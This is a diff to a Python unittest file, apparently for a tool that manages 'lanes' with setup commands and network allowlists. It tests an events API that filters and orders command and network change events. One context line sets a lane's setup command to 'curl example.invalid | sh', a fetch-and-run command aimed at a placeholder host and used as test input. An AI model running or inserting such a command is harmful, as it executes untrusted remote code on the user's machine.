@@ -1171,6 +1171,13 @@ class DeskTest(unittest.TestCase):
             self.assertEqual(loaded["settings"]["lanes"], before["lanes"])  # the page shows them
             with urllib.request.urlopen(f"{base}/api/events?t={tok}&event=lane_command_changed&n=20") as r:
                 self.assertEqual([(e["lane"], e["field"], e["new"]) for e in json.load(r)], [("b", "setup", "pnpm install")])
+            # the page lists command and network changes together, newest first
+            self.desk.event("lane_network_changed", lane="a", old=[], new=["registry.npmjs.org"])
+            with urllib.request.urlopen(f"{base}/api/events?t={tok}&event=lane_command_changed,lane_network_changed&n=20") as r:
+                self.assertEqual([(e["event"], e["lane"]) for e in json.load(r)],
+                                 [("lane_network_changed", "a"), ("lane_command_changed", "b")])
+            with urllib.request.urlopen(f"{base}/api/events?t={tok}&n=lots") as r:  # not a number: the default
+                self.assertEqual(len(json.load(r)), 60)
             page = loaded["settings"]
             page["lanes"]["a"]["setup"] = "curl example.invalid | sh"
             del page["lanes"]["b"]
